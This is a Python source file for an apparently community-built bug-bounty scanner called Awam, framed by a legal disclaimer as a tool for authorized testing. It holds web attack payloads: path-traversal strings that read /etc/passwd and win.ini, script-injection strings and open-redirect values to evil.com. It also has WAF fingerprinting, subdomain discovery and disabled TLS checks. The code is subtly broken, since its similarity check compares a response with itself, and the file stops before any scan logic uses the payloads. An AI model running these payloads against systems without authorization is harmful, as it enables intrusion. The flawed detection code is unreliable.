#!/usr/bin/env python3
"""
Awam - Bug Bounty Automation Framework (Enhanced)
Author: Community-Driven Development
Version: 2.0.0
Description: Tool otomatisasi untuk bug bounty dengan akurasi tinggi,
             false positive rendah, dan proof-of-exploit verification.
"""

import requests
import concurrent.futures
import time
import subprocess
import sys
import os
import json
import argparse
import threading
import socket
import dns.resolver
import re
import random
import urllib3
import tempfile
import hashlib
import signal
import csv
import itertools
import difflib
from urllib.parse import urljoin, urlparse, quote, unquote, parse_qs
from datetime import datetime, timedelta
from collections import defaultdict, Counter
from typing import Dict, List, Tuple, Optional, Set, Any, Union
from dataclasses import dataclass, field, asdict
from enum import Enum
from colorama import init, Fore, Style, Back
import statistics
import html
import urllib.parse
from queue import Queue

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

# ==================== CONSTANTS ====================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

LOG_FILE = os.path.join(SCRIPT_DIR, "awam_log.txt")
OUTPUT_TXT = os.path.join(SCRIPT_DIR, "awam_results.txt")
OUTPUT_JSON = os.path.join(SCRIPT_DIR, "awam_results.json")
OUTPUT_CSV = os.path.join(SCRIPT_DIR, "awam_results.csv")

# File untuk menyimpan data sementara
TEMP_DIR = os.path.join(SCRIPT_DIR, "temp")
os.makedirs(TEMP_DIR, exist_ok=True)

DEFAULT_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
]

TIMEOUT = 10
MAX_RETRIES = 2
BASELINE_SAMPLES = 5  # Increased for better baseline
MAX_THREADS = 20
DEFAULT_RATE = 3

# Legal warning
LEGAL_WARNING = f"""
{Fore.RED}{'='*80}
LEGAL DISCLAIMER AND WARNING
{'='*80}

{Fore.YELLOW}This tool is for authorized security testing and educational purposes ONLY.

{Fore.WHITE}By using this tool, you agree to:
1. ONLY test systems you own or have explicit written permission to test
2. Comply with all applicable laws and regulations
3. Respect bug bounty program scope and rules
4. Report findings responsibly through official channels
5. NOT use this tool for any illegal or unauthorized activities

{Fore.RED}UNAUTHORIZED USE IS STRICTLY PROHIBITED AND MAY RESULT IN:
- Criminal prosecution
- Civil liability
- Permanent ban from bug bounty programs
- Legal action from affected parties

{Fore.GREEN}Always verify scope and obtain proper authorization before testing.
{'='*80}{Style.RESET_ALL}
"""

# ==================== ENUMS ====================
class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

class Confidence(Enum):
    HIGH = "HIGH"      # Dapat direproduksi, evidence kuat, multiple indicators
    MEDIUM = "MEDIUM"   # Memerlukan verifikasi manual, beberapa indicator
    LOW = "LOW"         # Indikasi awal, perlu investigasi lebih lanjut

class VulnType(Enum):
    SQLI_TIME = "SQL Injection (Time-based)"
    SQLI_ERROR = "SQL Injection (Error-based)"
    SQLI_BOOLEAN = "SQL Injection (Boolean-based)"
    SQLI_UNION = "SQL Injection (Union-based)"
    XSS_REFLECTED = "Cross-Site Scripting (Reflected)"
    XSS_DOM = "Cross-Site Scripting (DOM-based)"
    XSS_STORED = "Cross-Site Scripting (Stored)"
    INFO_DISCLOSURE = "Information Disclosure"
    WAF_DETECTED = "WAF Detected"
    OPEN_REDIRECT = "Open Redirect"
    LFI = "Local File Inclusion"
    SSTI = "Server-Side Template Injection"
    CMD_INJECTION = "Command Injection"

# ==================== DATA CLASSES ====================
@dataclass
class ScanTarget:
    url: str
    domain: str
    ip: Optional[str] = None
    status_code: Optional[int] = None
    server: Optional[str] = None
    tech_stack: List[str] = field(default_factory=list)
    waf: Optional[Dict] = None
    response_time: float = 0.0
    content_length: int = 0
    headers: Dict = field(default_factory=dict)
    cookies: List[str] = field(default_factory=list)
    is_active: bool = False
    endpoints: Set[str] = field(default_factory=set)

# ==================== RATE LIMITER ====================
class RateLimiter:
    def __init__(self, max_per_second: int = 3):
        self.max_per_second = max_per_second
        self.lock = threading.Lock()
        self.request_times = []
        self.error_counts = defaultdict(int)
        self.dynamic_mode = False
    
    def wait(self):
        with self.lock:
            now = time.time()
            self.request_times = [t for t in self.request_times if now - t < 1.0]
            
            current_max = self.max_per_second // 2 if self.dynamic_mode else self.max_per_second
            
            if len(self.request_times) >= current_max:
                sleep_time = 1.0 - (now - self.request_times[0])
                if sleep_time > 0:
                    time.sleep(sleep_time)
            
            self.request_times.append(now)
    
    def report_error(self, error_type: str):
        self.error_counts[error_type] += 1
        if self.error_counts[error_type] > 5:
            self.dynamic_mode = True

# ==================== TARGET VALIDATOR ====================
class TargetValidator:
    """Validasi target dan fingerprinting teknologi"""
    
    @staticmethod
    def resolve_domain(domain: str) -> Optional[str]:
        """Resolve domain ke IP address"""
        try:
            return socket.gethostbyname(domain)
        except socket.gaierror:
            try:
                answers = dns.resolver.resolve(domain, 'A')
                return str(answers[0])
            except:
                return None
    
    @staticmethod
    def detect_waf(response: requests.Response) -> Optional[Dict]:
        """Deteksi Web Application Firewall"""
        waf_signatures = {
            'Cloudflare': {
                'headers': ['cf-ray', '__cfduid', 'cf-cache-status'],
                'cookies': ['__cfduid'],
                'content': ['cloudflare-nginx', 'cdn-cgi/'],
                'confidence': 'HIGH'
            },
            'AWS WAF': {
                'headers': ['x-amz-cf-id', 'x-amz-cf-pop', 'x-amzn-RequestId'],
                'cookies': ['AWSALB', 'AWSALBTG'],
                'content': ['Request blocked', 'AWS WAF'],
                'confidence': 'HIGH'
            },
            'F5 BIG-IP': {
                'headers': ['bigip', 'x-wa-info', 'x-application-context'],
                'cookies': ['BIGipServer', 'TS'],
                'content': ['The requested URL was rejected', 'F5'],
                'confidence': 'HIGH'
            }
        }
        
        headers = {k.lower(): v for k, v in response.headers.items()}
        content = response.text.lower()[:5000]
        
        try:
            cookie_names = [c.name.lower() for c in response.cookies] if response.cookies else []
        except:
            cookie_names = []
        
        for waf_name, sig in waf_signatures.items():
            for header in sig['headers']:
                if header.lower() in headers:
                    return {'name': waf_name, 'confidence': sig['confidence'], 'evidence': f"header:{header}"}
            
            for cookie in sig['cookies']:
                if any(cookie.lower() in c for c in cookie_names):
                    return {'name': waf_name, 'confidence': sig['confidence'], 'evidence': f"cookie:{cookie}"}
            
            for pattern in sig['content']:
                if pattern.lower() in content:
                    return {'name': waf_name, 'confidence': sig['confidence'], 'evidence': f"content:{pattern}"}
        
        return None
    
    @staticmethod
    def detect_tech_stack(response: requests.Response) -> List[str]:
        """Deteksi teknologi yang digunakan"""
        tech = []
        headers = response.headers
        server = headers.get('Server', '').lower()
        powered_by = headers.get('X-Powered-By', '').lower()
        
        if 'nginx' in server:
            tech.append('nginx')
        if 'apache' in server:
            tech.append('Apache')
        if 'cloudflare' in server:
            tech.append('Cloudflare')
        if 'php' in powered_by:
            tech.append('PHP')
        if 'asp.net' in powered_by:
            tech.append('ASP.NET')
        
        return list(set(tech))
    
    def validate(self, url: str, timeout: int = TIMEOUT) -> Optional[ScanTarget]:
        """Validasi target secara lengkap"""
        try:
            parsed = urlparse(url)
            domain = parsed.netloc or parsed.path.split('/')[0]
            
            if not domain:
                return None
            
            ip = self.resolve_domain(domain)
            if not ip and 'http' not in domain:
                return None
            
            session = requests.Session()
            session.headers.update({'User-Agent': random.choice(DEFAULT_USER_AGENTS)})
            session.verify = False
            session.max_redirects = 5
            
            start = time.time()
            response = session.get(url, timeout=timeout, allow_redirects=True)
            elapsed = time.time() - start
            
            target = ScanTarget(
                url=url,
                domain=domain,
                ip=ip,
                status_code=response.status_code,
                server=response.headers.get('Server', 'Unknown'),
                tech_stack=self.detect_tech_stack(response),
                waf=self.detect_waf(response),
                response_time=elapsed,
                content_length=len(response.content),
                headers=dict(response.headers),
                cookies=[c.name for c in response.cookies] if response.cookies else [],
                is_active=True
            )
            
            return target
            
        except Exception as e:
            return None

# ==================== PAYLOAD MANAGER ====================
class PayloadManager:
    """Manajemen payload dengan teknik bypass"""
    
    LFI_PAYLOADS = [
        ("../../../../etc/passwd", "unix", "basic"),
        ("....//....//....//etc/passwd", "unix", "double_dot"),
        ("..;/..;/..;/etc/passwd", "unix", "semicolon"),
        ("file:///etc/passwd", "unix", "file_protocol"),
        ("/etc/passwd", "unix", "absolute"),
        ("..\\..\\..\\windows\\win.ini", "windows", "windows_path"),
        ("%2e%2e%2f%2e%2e%2fetc/passwd", "unix", "url_encoded"),
    ]
    
    OPEN_REDIRECT = [
        ("//evil.com", "protocol_relative"),
        ("https://evil.com", "absolute"),
        ("//evil.com@google.com", "auth_bypass"),
        ("/\\evil.com", "backslash"),
        ("https:evil.com", "missing_slash"),
    ]
    
    XSS_PAYLOADS = {
        'basic': [
            ("<script>alert(1)</script>", "basic", "script_tag"),
            ("<ScRiPt>alert(1)</ScRiPt>", "basic", "case_bypass"),
        ],
        'img': [
            ("<img src=x onerror=alert(1)>", "img", "img_onerror"),
        ],
        'attribute': [
            ("\" onmouseover=alert(1) x=\"", "attr", "double_quote"),
            ("' onmouseover=alert(1) x='", "attr", "single_quote"),
        ]
    }
    
    @classmethod
    def get_xss_payloads(cls, with_bypass: bool = True, limit: int = 5):
        """Get XSS payloads"""
        payloads = []
        payloads.extend(cls.XSS_PAYLOADS['basic'])
        payloads.extend(cls.XSS_PAYLOADS['img'][:1])
        if with_bypass:
            payloads.extend(cls.XSS_PAYLOADS['attribute'][:1])
        return payloads[:limit]

# ==================== BASELINE RESPONSE ENGINE ====================
@dataclass
class BaselineResponse:
    """Baseline response characteristics for comparison"""
    url: str
    status_code: int
    headers: Dict[str, str]
    content_length: int
    content_hash: str
    response_time: float
    word_count: int
    line_count: int
    title: Optional[str]
    tech_stack: List[str]
    samples: int
    
    def to_dict(self):
        return {
            'url': self.url,
            'status_code': self.status_code,
            'content_length': self.content_length,
            'content_hash': self.content_hash,
            'response_time': self.response_time,
            'word_count': self.word_count,
            'line_count': self.line_count,
            'title': self.title,
            'tech_stack': self.tech_stack,
            'samples': self.samples
        }

class BaselineEngine:
    """Engine untuk membandingkan response normal vs payload"""
    
    def __init__(self):
        self.baselines: Dict[str, BaselineResponse] = {}
        
    def establish_baseline(self, url: str, responses: List[requests.Response]) -> Optional[BaselineResponse]:
        """Establish baseline from multiple samples"""
        if not responses:
            return None
            
        # Calculate averages
        avg_time = statistics.mean([r.elapsed.total_seconds() for r in responses])
        content_lengths = [len(r.content) for r in responses]
        avg_length = statistics.mean(content_lengths)
        
        # Get most common values
        status_codes = [r.status_code for r in responses]
        common_status = max(set(status_codes), key=status_codes.count)
        
        # Content hash
        content_hashes = [hashlib.md5(r.content).hexdigest() for r in responses]
        consistent = len(set(content_hashes)) == 1
        content_hash = content_hashes[0] if consistent else None
        
        # Extract title
        title = None
        try:
            title_match = re.search(r'<title>(.*?)</title>', responses[0].text, re.IGNORECASE | re.DOTALL)
            if title_match:
                title = title_match.group(1)
        except:
            pass
        
        baseline = BaselineResponse(
            url=url,
            status_code=common_status,
            headers=dict(responses[0].headers),
            content_length=int(avg_length),
            content_hash=content_hash,
            response_time=avg_time,
            word_count=len(responses[0].text.split()),
            line_count=len(responses[0].text.splitlines()),
            title=title,
            tech_stack=[],
            samples=len(responses)
        )
        
        self.baselines[url] = baseline
        return baseline
    
    def compare_response(self, url: str, response: requests.Response, 
                        payload: str) -> Dict[str, Any]:
        """Compare payload response with baseline"""
        if url not in self.baselines:
            return {'error': 'No baseline found'}
        
        baseline = self.baselines[url]
        
        # Basic comparisons
        diff = {
            'status_code_diff': response.status_code != baseline.status_code,
            'content_length_diff': abs(len(response.content) - baseline.content_length),
            'content_length_ratio': len(response.content) / baseline.content_length if baseline.content_length > 0 else 0,
            'response_time_diff': response.elapsed.total_seconds() - baseline.response_time,
            'response_time_ratio': response.elapsed.total_seconds() / baseline.response_time if baseline.response_time > 0 else 0,
            'word_count_diff': abs(len(response.text.split()) - baseline.word_count),
            'line_count_diff': abs(len(response.text.splitlines()) - baseline.line_count),
        }
        
        # Content hash comparison
        current_hash = hashlib.md5(response.content).hexdigest()
        diff['content_changed'] = current_hash != baseline.content_hash if baseline.content_hash else True
        
        # Calculate similarity ratio
        if baseline.content_length > 0 and len(response.content) > 0:
            baseline_text = response.text[:10000] if hasattr(response, 'text') else ''
            current_text = response.text[:10000] if hasattr(response, 'text') else ''
            
            if baseline_text and current_text:
                matcher = difflib.SequenceMatcher(None, baseline_text, current_text)
                diff['similarity_ratio'] = matcher.ratio()
            else:
                diff['similarity_ratio'] = 0
        else:
            diff['similarity_ratio'] = 0
        
        # Check for payload reflection
        diff['payload_reflected'] = payload in response.text if hasattr(response, 'text') else False
        diff['payload_reflected_encoded'] = quote(payload) in response.text if hasattr(response, 'text') else False
        
        return diff

# ==================== PROOF-OF-EXPLOIT VERIFIER ====================
class PoEVerifier:
    """Verify vulnerabilities with actual proof-of-exploit"""
    
    @staticmethod
    def verify_lfi(content: str) -> Dict[str, Any]:
        """Verify LFI with actual file content patterns"""
        indicators = {
            'unix_passwd': {
                'patterns': [
                    r'root:.*:0:0:',
                    r'daemon:.*:1:1:',
                    r'bin:.*:2:2:',
                ],
                'evidence': 'passwd_file'
            },
            'windows_ini': {
                'patterns': [
                    r'\[fonts\]',
                    r'\[extensions\]',
                    r'\[mail\]',
                ],
                'evidence': 'win_ini'
            }
        }
        
        findings = []
        
        for category, data in indicators.items():
            for pattern in data['patterns']:
                if re.search(pattern, content, re.IGNORECASE):
                    findings.append({
                        'type': category,
                        'pattern': pattern,
                        'evidence': data['evidence']
                    })
        
        return {
            'verified': len(findings) > 0,
            'findings': findings,
            'confidence': 'HIGH' if len(findings) > 1 else 'MEDIUM' if findings else 'LOW'
        }
    
    @staticmethod
    def verify_xss(content: str, payload: str, marker: str) -> Dict[str, Any]:
        """Verify XSS with context analysis"""
        if marker not in content:
            return {'verified': False, 'confidence': 'LOW'}
        
        # Find marker context
        marker_pos = content.find(marker)
        context_start = max(0, marker_pos - 100)
        context_end = min(len(content), marker_pos + 100)
        context = content[context_start:context_end]
        
        # Analyze HTML context
        context_analysis = {
            'in_script': bool(re.search(r'<script[^>]*>[^<]*' + re.escape(marker), content, re.IGNORECASE)),
            'in_event': bool(re.search(r'on\w+\s*=\s*["\'][^"\']*' + re.escape(marker), content, re.IGNORECASE)),
            'in_href': bool(re.search(r'href\s*=\s*["\'][^"\']*' + re.escape(marker), content, re.IGNORECASE)),
        }
        
        # Calculate severity based on context
        if context_analysis['in_script'] or context_analysis['in_event']:
            severity = 'CRITICAL'
            confidence = 'HIGH'
        else:
            severity = 'MEDIUM'
            confidence = 'MEDIUM'
        
        return {
            'verified': True,
            'context': context_analysis,
            'severity': severity,
            'confidence': confidence,
            'context_snippet': context
        }
    
    @staticmethod
    def verify_redirect(location: str, original_url: str) -> Dict[str, Any]:
        """Verify open redirect"""
        parsed_location = urlparse(location)
        parsed_original = urlparse(original_url)
        
        # Check if redirect is to different domain
        is_external = parsed_location.netloc and parsed_location.netloc != parsed_original.netloc
        
        # Check for dangerous patterns
        dangerous_patterns = [
            ('//evil.com', 'protocol_relative'),
            (r'https?://evil\.com', 'absolute_url'),
        ]
        
        findings = []
        for pattern, technique in dangerous_patterns:
            if re.search(pattern, location, re.IGNORECASE):
                findings.append(technique)
        
        return {
            'verified': is_external or len(findings) > 0,
            'is_external': is_external,
            'techniques': findings,
            'confidence': 'HIGH' if findings else 'MEDIUM' if is_external else 'LOW'
        }

# ==================== CONFIDENCE SCORING ENGINE ====================
class ConfidenceScorer:
    """Calculate confidence score based on multiple factors"""
    
    def __init__(self):
        self.weights = {
            'baseline_deviation': 0.15,
            'payload_reflection': 0.20,
            'multiple_indicators': 0.25,
            'behavioral_change': 0.15,
            'poe_verification': 0.25
        }
    
    def calculate_score(self, vuln_type: VulnType, baseline_diff: Dict,
                       verification: Dict, indicators: List[str]) -> Dict[str, Any]:
        """Calculate confidence score and level"""
        score = 0.0
        factors = []
        
        # Factor 1: Baseline deviation
        if baseline_diff:
            if baseline_diff.get('content_changed', False):
                score += self.weights['baseline_deviation'] * 0.8
                factors.append('content_changed')
            if baseline_diff.get('status_code_diff', False):
                score += self.weights['baseline_deviation'] * 0.2
                factors.append('status_changed')
        
        # Factor 2: Payload reflection
        if baseline_diff and baseline_diff.get('payload_reflected', False):
            score += self.weights['payload_reflection'] * 0.7
            factors.append('payload_reflected')
        
        # Factor 3: Multiple indicators
        indicator_count = len(indicators)
        if indicator_count >= 2:
            score += self.weights['multiple_indicators']
            factors.append(f'multiple_indicators_{indicator_count}')
        elif indicator_count == 1:
            score += self.weights['multiple_indicators'] * 0.6
            factors.append('one_indicator')
        
        # Factor 4: Behavioral change
        if baseline_diff and baseline_diff.get('response_time_ratio', 1) > 3:
            score += self.weights['behavioral_change'] * 0.8
            factors.append('significant_delay')
        
        # Factor 5: PoE verification
        if verification and verification.get('verified', False):
            poe_confidence = verification.get('confidence', 'LOW')
            if poe_confidence == 'HIGH':
                score += self.weights['poe_verification']
                factors.append('poe_high')
            elif poe_confidence == 'MEDIUM':
                score += self.weights['poe_verification'] * 0.6
                factors.append('poe_medium')
        
        # Determine confidence level
        if score >= 0.8:
            level = Confidence.HIGH
        elif score >= 0.5:
            level = Confidence.MEDIUM
        else:
            level = Confidence.LOW
        
        return {
            'score': round(score * 100, 1),
            'level': level,
            'factors': factors
        }

# ==================== FALSE POSITIVE FILTER ====================
class FalsePositiveFilter:
    """Filter false positives with multiple validation techniques"""
    
    def __init__(self):
        pass
    
    def filter_lfi(self, response_text: str) -> Tuple[bool, List[str]]:
        """Filter LFI false positives"""
        reasons = []
        
        # Must have actual file content indicators
        file_indicators = [
            'root:', 'daemon:', 'bin:', 'sys:',
            '[fonts]', '[extensions]', '<?php'
        ]
        
        text_lower = response_text.lower()
        has_file_indicators = any(i in text_lower for i in file_indicators)
        
        if not has_file_indicators:
            reasons.append('No file content indicators found')
            return False, reasons
        
        # Check if it's actually a directory listing
        dir_indicators = ['index of', 'parent directory']
        has_dir_indicators = any(d in text_lower for d in dir_indicators)
        
        if has_dir_indicators:
            reasons.append('Directory listing detected')
            return False, reasons
        
        return True, reasons
    
    def filter_open_redirect(self, location: str, original_url: str) -> Tuple[bool, List[str]]:
        """Filter open redirect false positives"""
        reasons = []
        
        # Must be a redirect
        if not location:
            reasons.append('No Location header')
            return False, reasons
        
        # Check if redirect is to same domain (likely safe)
        parsed_location = urlparse(location)
        parsed_original = urlparse(original_url)
        
        if parsed_location.netloc == parsed_original.netloc:
            reasons.append('Redirect to same domain')
            return False, reasons
        
        return True, reasons

# ==================== VULNERABILITY CLASS ====================
@dataclass
class Vulnerability:
    vuln_type: VulnType
    target: str
    severity: Severity
    confidence: Confidence
    confidence_score: float = 0.0
    confidence_factors: List[str] = field(default_factory=list)
    payload: Optional[str] = None
    parameter: Optional[str] = None
    evidence: Optional[str] = None
    description: Optional[str] = None
    remediation: Optional[str] = None
    curl_command: Optional[str] = None
    poe_verified: bool = False
    poe_details: Optional[Dict] = None
    baseline_diff: Optional[Dict] = None
    timestamp: datetime = field(default_factory=datetime.now)
    
    def to_dict(self):
        return {
            'type': self.vuln_type.value,
            'target': self.target,
            'severity': self.severity.value,
            'confidence': self.confidence.value,
            'confidence_score': self.confidence_score,
            'confidence_factors': self.confidence_factors,
            'payload': self.payload,
            'parameter': self.parameter,
            'evidence': self.evidence,
            'description': self.description,
            'remediation': self.remediation,
            'curl': self.curl_command,
            'poe_verified': self.poe_verified,
            'poe_details': self.poe_details,
            'timestamp': self.timestamp.isoformat()
        }
    
    def generate_curl(self):
        """Generate curl command for reproduction"""
        if self.parameter and self.payload:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            if self.parameter in params:
                original = params[self.parameter][0]
                url = self.target.replace(f"{self.parameter}={original}", 
                                         f"{self.parameter}={urllib.parse.quote(self.payload)}")
                self.curl_command = f"curl -k -X GET '{url}'"
        return self.curl_command

# ==================== LOGGER ====================
class Logger:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.targets: Dict[str, ScanTarget] = {}
        self.baselines: Dict[str, BaselineResponse] = {}
        self.stats = {
            'requests': 0,
            'targets_discovered': 0,
            'targets_active': 0,
            'vulnerabilities_found': 0,
            'false_positives_caught': 0,
            'waf_detected': 0,
            'errors': 0,
            'poe_verified': 0,
        }
        self.start_time = datetime.now()
        self.console_output = True
        self.lock = threading.Lock()
        self.fp_filter = FalsePositiveFilter()
        
    def set_console_output(self, enabled: bool):
        self.console_output = enabled
        
    def log(self, message: str, level: str = "INFO"):
        """Log dengan warna ke console dan file"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.MAGENTA + Style.BRIGHT,
            "DEBUG": Fore.LIGHTBLACK_EX,
            "WAF": Fore.LIGHTRED_EX,
            "PROGRESS": Fore.LIGHTYELLOW_EX,
            "POE": Fore.GREEN + Style.BRIGHT,
        }
        
        color = colors.get(level, Fore.WHITE)
        
        with self.lock:
            if self.console_output:
                print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
            
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] [{level}] {message}\n")
    
    def add_vulnerability(self, vuln: Vulnerability) -> bool:
        """Tambah vulnerability dengan verifikasi"""
        
        # Apply false positive filtering
        is_valid = True
        filter_reasons = []
        
        if vuln.vuln_type == VulnType.LFI and vuln.evidence:
            is_valid, filter_reasons = self.fp_filter.filter_lfi(vuln.evidence)
        
        elif vuln.vuln_type == VulnType.OPEN_REDIRECT and vuln.evidence:
            is_valid, filter_reasons = self.fp_filter.filter_open_redirect(
                vuln.evidence, vuln.target)
        
        if not is_valid:
            with self.lock:
                self.stats['false_positives_caught'] += 1
            self.log(f"False positive filtered: {vuln.vuln_type.value}", "DEBUG")
            return False
        
        # Add to vulnerabilities
        vuln.generate_curl()
        
        with self.lock:
            self.vulnerabilities.append(vuln)
            self.stats['vulnerabilities_found'] += 1
            if vuln.poe_verified:
                self.stats['poe_verified'] += 1
        
        # Color based on severity
        severity_colors = {
            Severity.CRITICAL: Back.RED + Fore.WHITE + Style.BRIGHT,
            Severity.HIGH: Fore.MAGENTA + Style.BRIGHT,
            Severity.MEDIUM: Fore.YELLOW,
        }
        sev_color = severity_colors.get(vuln.severity, Fore.WHITE)
        
        self.log(
            f"[!] {vuln.vuln_type.value} on {vuln.target} "
            f"[{sev_color}{vuln.severity.value}{Style.RESET_ALL}] "
            f"[Confidence: {vuln.confidence.value} ({vuln.confidence_score}%)]",
            "VULN"
        )
        
        if vuln.poe_verified:
            self.log(f"    ✓ PoE Verified", "POE")
        
        if vuln.curl_command:
            self.log(f"    Reproduction: {vuln.curl_command}", "DEBUG")
        
        self.save_results()
        return True
    
    def add_target(self, target: ScanTarget):
        """Tambah target ke database"""
        with self.lock:
            self.targets[target.url] = target
            self.stats['targets_discovered'] = len(self.targets)
            self.stats['targets_active'] = len([t for t in self.targets.values() if t.is_active])
            
            if target.waf:
                self.stats['waf_detected'] += 1
    
    def add_baseline(self, url: str, baseline: BaselineResponse):
        """Add baseline to database"""
        with self.lock:
            self.baselines[url] = baseline
    
    def save_results(self):
        """Simpan hasil ke berbagai format"""
        duration = datetime.now() - self.start_time
        
        # Hitung breakdown
        by_severity = defaultdict(int)
        by_confidence = defaultdict(int)
        by_type = defaultdict(int)
        
        for v in self.vulnerabilities:
            by_severity[v.severity.value] += 1
            by_confidence[v.confidence.value] += 1
            by_type[v.vuln_type.value] += 1
        
        # Hitung akurasi
        total_findings = self.stats['vulnerabilities_found'] + self.stats['false_positives_caught']
        accuracy = (self.stats['vulnerabilities_found'] / total_findings * 100) if total_findings > 0 else 0
        
        report = {
            'scan_info': {
                'timestamp': self.start_time.isoformat(),
                'duration': str(duration).split('.')[0],
                'tool': 'Awam v2.0.0 (Enhanced)'
            },
            'statistics': {
                **self.stats,
                'accuracy': round(accuracy, 1),
                'total_findings': total_findings,
                'poe_rate': round(self.stats['poe_verified'] / self.stats['vulnerabilities_found'] * 100, 1) if self.stats['vulnerabilities_found'] > 0 else 0
            },
            'breakdown': {
                'by_severity': dict(by_severity),
                'by_confidence': dict(by_confidence),
                'by_type': dict(by_type),
            },
            'targets': {
                url: {
                    'domain': t.domain,
                    'ip': t.ip,
                    'status': t.status_code,
                    'server': t.server,
                    'tech': t.tech_stack,
                    'waf': t.waf,
                } for url, t in self.targets.items()
            },
            'vulnerabilities': [v.to_dict() for v in self.vulnerabilities]
        }
        
        # JSON Output
        with open(OUTPUT_JSON, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Text Output
        with open(OUTPUT_TXT, 'w', encoding='utf-8') as f:
            f.write(self._generate_text_report(duration, by_severity, accuracy))
    
    def _generate_text_report(self, duration, by_severity, accuracy):
        """Generate text report"""
        lines = []
        lines.append("="*80)
        lines.append("AWAM - BUG BOUNTY SCAN RESULTS".center(80))
        lines.append("="*80)
        lines.append(f"Scan Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"Duration: {str(duration).split('.')[0]}")
        lines.append("="*80)
        lines.append("")
        
        lines.append("SCAN STATISTICS:")
        lines.append("-"*40)
        lines.append(f"Requests Made: {self.stats['requests']:,}")
        lines.append(f"Targets Discovered: {self.stats['targets_discovered']}")
        lines.append(f"Active Targets: {self.stats['targets_active']}")
        lines.append(f"WAF Detected: {self.stats['waf_detected']}")
        lines.append(f"Vulnerabilities Found: {self.stats['vulnerabilities_found']}")
        lines.append(f"False Positives Caught: {self.stats['false_positives_caught']}")
        lines.append(f"PoE Verified: {self.stats['poe_verified']}")
        lines.append(f"Detection Accuracy: {accuracy:.1f}%")
        lines.append("")
        
        lines.append("VULNERABILITIES BY SEVERITY:")
        lines.append("-"*40)
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            count = by_severity.get(severity, 0)
            lines.append(f"{severity}: {count}")
        
        return "\n".join(lines)

logger = Logger()

# ==================== SCANNER CLASS ====================
class AwamScanner:
    def __init__(self, target: str, threads: int = 10, rate_limit: int = 3, 
                 user_agent: Optional[str] = None, verbose: bool = False,
                 scope_domains: Optional[List[str]] = None):
        
        self.target = target
        if not target.startswith(('http://', 'https://')):
            self.target = 'https://' + target
        
        self.base_domain = urlparse(self.target).netloc
        self.scope_domains = scope_domains or [self.base_domain]
        self.threads = min(threads, MAX_THREADS)
        self.rate_limiter = RateLimiter(rate_limit)
        self.verbose = verbose
        self.validator = TargetValidator()
        self.payloads = PayloadManager()
        
        # New engines
        self.baseline_engine = BaselineEngine()
        self.poe_verifier = PoEVerifier()
        self.confidence_scorer = ConfidenceScorer()
        
        # Setup session
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or random.choice(DEFAULT_USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.session.verify = False
        self.session.max_redirects = 5
        
        # State
        self.targets_to_scan: List[ScanTarget] = []
        self.discovered_urls: Set[str] = set()
        self.results_lock = threading.Lock()
        
        # Set console output based on verbose
        logger.set_console_output(verbose)
    
    def make_request(self, url: str, method: str = 'GET', 
                     timeout: int = TIMEOUT, **kwargs) -> Optional[requests.Response]:
        """Request dengan rate limiting"""
        self.rate_limiter.wait()
        
        with self.results_lock:
            logger.stats['requests'] += 1
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=timeout, **kwargs)
            else:
                response = self.session.post(url, timeout=timeout, **kwargs)
            
            if self.verbose:
                logger.log(f"{method} {url} -> {response.status_code}", "DEBUG")
            
            return response
            
        except Exception as e:
            if self.verbose:
                logger.log(f"Request error: {str(e)[:50]}", "DEBUG")
            return None
    
    def is_in_scope(self, url: str) -> bool:
        """Check if URL is in scope"""
        try:
            domain = urlparse(url).netloc
            for scope in self.scope_domains:
                if domain.endswith(scope):
                    return True
            return False
        except:
            return False
    
    def discover_subdomains(self) -> List[str]:
        """Subdomain discovery via CRT.sh"""
        logger.log("Starting subdomain discovery...", "INFO")
        
        subdomains = set()
        
        try:
            url = f"https://crt.sh/?q=%.{self.base_domain}&output=json"
            response = self.make_request(url, timeout=15)
            if response and response.status_code == 200:
                data = response.json()
                for entry in data[:100]:
                    name = entry.get('name_value', '')
                    if name:
                        for sub in name.split('\n'):
                            sub = sub.strip()
                            if sub and sub.endswith(self.base_domain) and '*' not in sub:
                                subdomains.add(sub)
                logger.log(f"CRT.sh: Found {len(subdomains)} subdomains", "SUCCESS")
        except Exception as e:
            logger.log(f"CRT.sh error: {e}", "DEBUG")
        
        return list(subdomains)
    
